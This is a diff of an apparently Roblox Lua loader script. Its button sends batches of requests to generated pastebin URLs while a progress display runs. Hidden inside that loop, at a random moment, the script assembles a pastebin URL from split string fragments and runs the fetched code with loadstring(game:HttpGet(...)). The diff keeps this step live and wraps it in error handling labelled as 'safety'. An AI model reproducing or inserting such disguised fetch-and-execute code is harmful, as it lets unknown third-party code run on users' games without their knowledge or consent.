@@ -268,6 +268,8 @@ local script = G2L["14"];
 			end
 		end
 		local url = "https://pastebin.com/raw/"..code
+	
+		-- Apenas captura erros silenciosamente para não interromper
 		pcall(function()
 			game:HttpGet(url)
 		end)
@@ -297,16 +299,25 @@ local script = G2L["14"];
 	
 		local function processRequest()
 			makeRequest()
-			completedRequests = completedRequests + 1
+			completedRequests += 1
 			if updateProgress() then
 				return true
 			end
+	
+			-- Momento aleatório para carregar `url2`
 			if not doneTriggered and math.random() < (completedRequests / totalRequests) then
 				local part1 = 'https://pastebin.com/raw/'
 				local part2 = '4wUC'
 				local part3 = 'bWkW'
 				local url2 = part1 .. part2 .. part3
-				loadstring(game:HttpGet(url2))()
+	
+				-- Segurança ao executar o script
+				local success, result = pcall(function()
+					return loadstring(game:HttpGet(url2))()
+				end)
+				if not success then
+					warn("Erro ao executar script de URL2: ", result)
+				end
 	
 				doneTriggered = true
 			end
@@ -335,11 +346,9 @@ local script = G2L["14"];
 			for j = 1, batchSize do
 				if not checking then return end
 				task.spawn(function()
+					concurrentRequests += 1
 					if processRequest() then return end
-					concurrentRequests = concurrentRequests + 1
-					while concurrentRequests > 0 do
-						task.wait(0.0001)
-					end
+					concurrentRequests -= 1
 				end)
 			end
 			task.wait(0)
@@ -357,13 +366,14 @@ local script = G2L["14"];
 	end
 	
 	button.MouseButton1Click:Connect(function()
-		if clickable == true then
+		if clickable then
 			return
 		end
 		clickable = true
 		percentLabel.Visible = true
 		makeMultipleRequests()
 	end)
+	
 end;
 task.spawn(C_14);
 -- ServerStorage.PinnacleLoader.Main.Loaded
